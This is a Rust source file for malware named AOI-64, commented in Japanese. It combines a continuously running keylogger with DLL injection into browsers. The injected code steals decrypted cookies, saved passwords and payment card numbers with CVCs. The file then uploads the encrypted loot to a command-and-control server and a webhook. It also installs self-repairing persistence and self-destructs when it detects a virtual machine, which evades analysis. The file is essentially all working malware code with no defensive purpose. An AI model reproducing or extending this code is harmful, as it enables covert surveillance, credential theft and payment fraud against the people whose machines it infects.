// AOI-64 - 常時キーロガー動作版
// 
// 設定制御の使用例:
// 環境変数 AOI64_PROFILE=production で本番環境設定を使用
// 環境変数 AOI64_PROFILE=development で開発環境設定を使用
// 設定なしの場合はデフォルト（安全モード）
//
// 例: $env:AOI64_PROFILE="production"; ./aoi_64.exe
//
use aoi_64::{
    load_config_or_default, send_unified_webhook, utils::emergency_self_destruct, C2Client, IntegratedPayload
};
// rmp_serde は crypto.rs に統一
use serde::{Deserialize, Serialize};
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use tokio::time::{sleep, Duration};

#[cfg(windows)]
use aoi_64::services::{BrowserData, BrowserInjector};

// DLL IPCデータ構造
#[derive(Serialize, Deserialize)]
struct CookieOut {
    host: String,
    name: String,
    path: String,
    value: String,
    expires: i64,
    secure: bool,
    #[serde(rename = "httpOnly")]
    http_only: bool,
}

#[derive(Serialize, Deserialize)]
struct PasswordOut {
    origin: String,
    username: String,
    password: String,
}

#[derive(Serialize, Deserialize)]
struct PaymentOut {
    name_on_card: String,
    expiration_month: i64,
    expiration_year: i64,
    card_number: String,
    cvc: String,
}

#[derive(Serialize, Deserialize)]
struct ChromeDecryptData {
    browser_name: String,
    profile_name: String,
    cookies: Vec<CookieOut>,
    passwords: Vec<PasswordOut>,
    payments: Vec<PaymentOut>,
}

#[derive(Serialize, Deserialize)]
struct ChromeDecryptResult {
    browser_type: String,
    profiles: Vec<ChromeDecryptData>,
    total_cookies: usize,
    total_passwords: usize,
    total_payments: usize,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {

    // 多重起動防止チェック（Windows環境のみ）
    #[cfg(windows)]
    {
        use aoi_64::services::check_and_prevent_multiple_instances;
        match check_and_prevent_multiple_instances() {
            Ok(true) => {
                // 新しいインスタンスを続行
            },
            Ok(false) => {
                println!("⚠️  既に実行中のインスタンスが検出されました。終了します。");
                return Ok(());
            },
            Err(e) => {
                println!("❌ インスタンスチェックエラー: {}", e);
                // エラーの場合は続行（安全性のため）
            }
        }
    }

    let config = load_config_or_default();
    let mut c2_client = C2Client::new(config.clone());

    // 初回データ収集 - OS条件分岐を統合
    let payload = perform_initial_collection(&config).await?;
    process_and_save_data(payload, &config, &mut c2_client).await?;

    // メインループ開始
    run_main_loop(config, c2_client).await
}

/// 初回データ収集処理（OS条件分岐統合）
async fn perform_initial_collection(config: &aoi_64::Config) -> Result<IntegratedPayload, Box<dyn std::error::Error>> {
    let (dll_result, payload_result) = tokio::join!(
        collect_browser_data_via_dll(),
        IntegratedPayload::create_with_config(config)
    );
    
    let mut payload = payload_result?;
    
    // Windows環境でDLLデータが取得できた場合のみ統合
    #[cfg(windows)]
    if let Some(dll_data) = dll_result {
        integrate_dll_data(&mut payload, &dll_data);
    }
    
    Ok(payload)
}

/// DLLデータをペイロードに統合（重複コード削減）
#[cfg(windows)]
fn integrate_dll_data(payload: &mut IntegratedPayload, dll_data: &BrowserData) {
    // パスワード統合
    for password in &dll_data.passwords {
        payload.auth_data.passwords.push(format!(
            "[DLL_DECRYPTED] {}|{}|{}",
            password.origin, password.username, password.password
        ));
    }
    
    // クッキー統合
    for cookie in &dll_data.cookies {
        payload.auth_data.passwords.push(format!(
            "[DLL_COOKIE] {}|{}|{}",
            cookie.host, cookie.name, cookie.value
        ));
    }
    
    // 支払い情報統合
    for payment in &dll_data.payments {
        payload.auth_data.passwords.push(format!(
            "[DLL_PAYMENT] {}|{}|{}|{}",
            payment.card_number, payment.name_on_card,
            payment.expiration_month, payment.expiration_year
        ));
    }
}

/// 効率的なメインループ（タスク管理簡略化）
async fn run_main_loop(
    config: aoi_64::Config,
    c2_client: C2Client,
) -> Result<(), Box<dyn std::error::Error>> {
    let shutdown = Arc::new(AtomicBool::new(false));


    // 永続化処理の実装（設定フラグによる制御）
    if config.enable_persistence {
        aoi_64::services::setup_persistence(&config).await;
    } else {
        println!("ℹ️  永続化機能は無効に設定されています");
    }

    // Ctrl+C ハンドラー
    let shutdown_clone = shutdown.clone();
    let _signal_task = tokio::spawn(async move {
        let _ = tokio::signal::ctrl_c().await;
        shutdown_clone.store(true, Ordering::Relaxed);
    });

    // キーロガータスク（Windows専用）
    #[cfg(windows)]
    let _keylogger_task = tokio::spawn({
        let shutdown = shutdown.clone();
        async move { continuous_keylogger(shutdown).await }
    });

    // C2クライアントタスク（設定有効時のみ）
    let _c2_task = if config.command_server_enabled {
        Some(tokio::spawn({
            let mut c2_client = c2_client;
            let shutdown = shutdown.clone();
            async move {
                while !shutdown.load(Ordering::Relaxed) {
                    if c2_client.start_c2_loop().await.is_err() {
                        sleep(Duration::from_secs(10)).await;
                    }
                }
            }
        }))
    } else {
        None
    };

    // VM検知監視タスク
    let _vm_task = tokio::spawn({
        let shutdown = shutdown.clone();
        async move {
            use aoi_64::security::detect_vm_environment;
            while !shutdown.load(Ordering::Relaxed) {
                sleep(Duration::from_secs(60)).await;
                if detect_vm_environment(true) {
                    emergency_self_destruct().await;
                    std::process::exit(0);
                }
            }
        }
    });

    // 永続化自己修復タスク（5分ごとにチェック）- 設定により制御
    let _persistence_task = if config.enable_persistence_repair {
        Some(tokio::spawn({
            let shutdown = shutdown.clone();
            let config = config.clone();
            async move {
                while !shutdown.load(Ordering::Relaxed) {
                    sleep(Duration::from_secs(300)).await; // 5分間隔
                    aoi_64::services::verify_and_repair_persistence(&config).await;
                }
            }
        }))
    } else {
        None
    };

    // メインループ - shutdownフラグ監視
    while !shutdown.load(Ordering::Relaxed) {
        sleep(Duration::from_secs(1)).await;
    }

    // 最終保存（Windows専用）
    #[cfg(windows)]
    let _ = aoi_64::save_session_to_file();

    Ok(())
}

// start/cleanup は run_main_loop 内にインライン化

/// 完全常時キーロガー実行（休憩なし）
#[cfg(windows)]
async fn continuous_keylogger(running: Arc<AtomicBool>) {
    use aoi_64::collectors::key_mouse_logger::{collect_input_events_for, InputEvent};
    use aoi_64::save_session_to_file;
    use std::collections::VecDeque;
    use std::sync::{Arc, Mutex};

    // サイレント起動

    // リアルタイムイベントバッファ
    let event_buffer: Arc<Mutex<VecDeque<InputEvent>>> = Arc::new(Mutex::new(VecDeque::new()));
    let _buffer_clone = event_buffer.clone();
    let running_clone = running.clone();

    // バックグラウンドでの定期保存タスク
    let save_task = tokio::spawn(async move {
        let mut _save_count = 0;
        while running_clone.load(Ordering::Relaxed) {
            sleep(Duration::from_secs(30)).await; // 30秒ごとに保存

            _save_count += 1;
            let _ = save_session_to_file(); // サイレント保存
        }
    });

    // メインキーロガーループ - 完全連続動作
    let mut _total_events = 0;
    while running.load(Ordering::Relaxed) {
        // 1秒間のキャプチャ（短時間で連続実行）
        let events_text = tokio::task::spawn_blocking(|| {
            collect_input_events_for(1000) // 1秒間
        })
        .await
        .unwrap_or_default();

        if !events_text.is_empty() {
            _total_events += events_text.len();
            // サイレント動作（イベントごとの出力なし）
        }

        // 休憩完全削除 - 即座に次のキャプチャ（高速連続動作）
    }

    // 保存タスクを停止
    save_task.abort();

    // 最終保存（サイレント）
    let _ = save_session_to_file();
}

#[cfg(not(windows))]
async fn continuous_keylogger(running: Arc<AtomicBool>) {
    // サイレント待機
    while running.load(Ordering::Relaxed) {
        sleep(Duration::from_secs(10)).await;
    }
}

// 初回データ収集は main にインライン化

/// ブラウザDLL注入でデータ収集（Windows専用）
#[cfg(windows)]
async fn collect_browser_data_via_dll() -> Option<BrowserData> {
    let injector = BrowserInjector::new().ok()?;
    let ipc_handle = tokio::spawn(receive_ipc_data());
    
    // DLL注入を実行
    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
    let mut browser_data = injector.inject_all_browsers().await.ok()?;
    
    // IPCデータ受信（タイムアウト付き）
    if let Ok(Ok(Some(ipc_result))) = tokio::time::timeout(
        tokio::time::Duration::from_secs(10), 
        ipc_handle
    ).await {
        // IPCデータを統合
        for profile in &ipc_result.profiles {
            integrate_ipc_profile_data(&mut browser_data, profile);
        }
    }
    
    Some(browser_data)
}

/// IPCプロファイルデータをブラウザデータに統合
#[cfg(windows)]
fn integrate_ipc_profile_data(browser_data: &mut BrowserData, profile: &ChromeDecryptData) {
    use aoi_64::services::{DllCookieOut, DllPasswordOut, DllPaymentOut};
    
    // パスワード追加
    for password in &profile.passwords {
        browser_data.passwords.push(DllPasswordOut {
            origin: format!("[IPC_{}] {}", profile.browser_name, password.origin),
            username: password.username.clone(),
            password: password.password.clone(),
        });
    }
    
    // クッキー追加
    for cookie in &profile.cookies {
        browser_data.cookies.push(DllCookieOut {
            host: format!("[IPC_{}] {}", profile.browser_name, cookie.host),
            name: cookie.name.clone(),
            path: cookie.path.clone(),
            value: cookie.value.clone(),
            expires: cookie.expires,
            secure: cookie.secure,
            http_only: cookie.http_only,
        });
    }
    
    // 支払い情報追加
    for payment in &profile.payments {
        browser_data.payments.push(DllPaymentOut {
            name_on_card: format!("[IPC_{}] {}", profile.browser_name, payment.name_on_card),
            expiration_month: payment.expiration_month,
            expiration_year: payment.expiration_year,
            card_number: payment.card_number.clone(),
            cvc: payment.cvc.clone(),
        });
    }
}

#[cfg(not(windows))]
async fn collect_browser_data_via_dll() -> Option<()> {
    None
}

/// Windows名前付きパイプサーバーでDLLからIPCデータを受信
#[cfg(windows)]
async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
    use std::ffi::c_void;
    use std::ptr;

    // Windows API定義
    #[link(name = "kernel32")]
    extern "system" {
        fn CreateNamedPipeW(
            lpName: *const u16,
            dwOpenMode: u32,
            dwPipeMode: u32,
            nMaxInstances: u32,
            nOutBufferSize: u32,
            nInBufferSize: u32,
            nDefaultTimeOut: u32,
            lpSecurityAttributes: *mut c_void,
        ) -> *mut c_void;
        fn ConnectNamedPipe(hNamedPipe: *mut c_void, lpOverlapped: *mut c_void) -> i32;
        fn ReadFile(
            hFile: *mut c_void,
            lpBuffer: *mut c_void,
            nNumberOfBytesToRead: u32,
            lpNumberOfBytesRead: *mut u32,
            lpOverlapped: *mut c_void,
        ) -> i32;
        fn CloseHandle(hObject: *mut c_void) -> i32;
        fn GetLastError() -> u32;
    }

    const PIPE_ACCESS_INBOUND: u32 = 0x00000001;
    const PIPE_TYPE_BYTE: u32 = 0x00000000;
    const PIPE_READMODE_BYTE: u32 = 0x00000000;
    const PIPE_WAIT: u32 = 0x00000000;
    const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;

    // パイプ名をワイド文字に変換
    let pipe_name = "\\\\.\\pipe\\rat64_chrome_data\0"
        .encode_utf16()
        .collect::<Vec<u16>>();

    unsafe {
        // パイプ作成
        let pipe_handle = CreateNamedPipeW(
            pipe_name.as_ptr(),
            PIPE_ACCESS_INBOUND,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 0, 10485760, 0, ptr::null_mut(),
        );
        
        if pipe_handle == INVALID_HANDLE_VALUE {
            return None;
        }
        
        // 接続確立
        let connect_result = ConnectNamedPipe(pipe_handle, ptr::null_mut());
        if connect_result == 0 && GetLastError() != 535 {
            CloseHandle(pipe_handle);
            return None;
        }
        
        // データ受信
        let mut buffer = vec![0u8; 1024 * 1024];
        let mut bytes_read = 0u32;
        
        let read_success = ReadFile(
            pipe_handle,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.len() as u32,
            &mut bytes_read,
            ptr::null_mut()
        ) != 0;
        
        CloseHandle(pipe_handle);
        
        // JSONデシリアライズ
        if read_success && bytes_read > 0 {
            buffer.truncate(bytes_read as usize);
            serde_json::from_str(&String::from_utf8_lossy(&buffer)).ok()
        } else {
            None
        }
    }
}

/// データの暗号化・保存・送信処理
async fn process_and_save_data(
    payload: aoi_64::IntegratedPayload,
    config: &aoi_64::Config,
    c2_client: &mut C2Client,
) -> Result<(), Box<dyn std::error::Error>> {
    use aoi_64::utils::crypto::{process_and_encrypt_data, upload_encrypted_to_c2_with_filename};

    // 暗号化処理を統合関数で実行（セキュリティ強化: 生キー・ナンスは保持しない）
    let (encrypted, wrapped, data_filename, _key_filename) = process_and_encrypt_data(&payload, config).await?;

    // 設定に基づいて逐次実行
    let upload_enabled = config.command_server_enabled;
    let webhook_enabled = config.webhook_enabled && !config.webhook_url.trim().is_empty();

    // C2アップロード
    if upload_enabled {
        match upload_encrypted_to_c2_with_filename(
            c2_client, &encrypted, &wrapped, "integrated_payload", Some(&data_filename)
        ).await {
            Ok(()) => println!("✅ C2 upload completed successfully"),
            Err(e) => println!("❌ C2 upload failed: {}", e),
        }
    }
    
    // Webhook送信
    if webhook_enabled {
        match send_unified_webhook(&payload, config).await {
            Ok(()) => println!("✅ Webhook sent successfully"),
            Err(e) => println!("❌ Webhook failed: {}", e),
        }
    }
    
    // 両方無効の場合
    if !upload_enabled && !webhook_enabled {
        println!("📦 Data encrypted and saved locally only (no upload configured)");
    }

    Ok(())
}
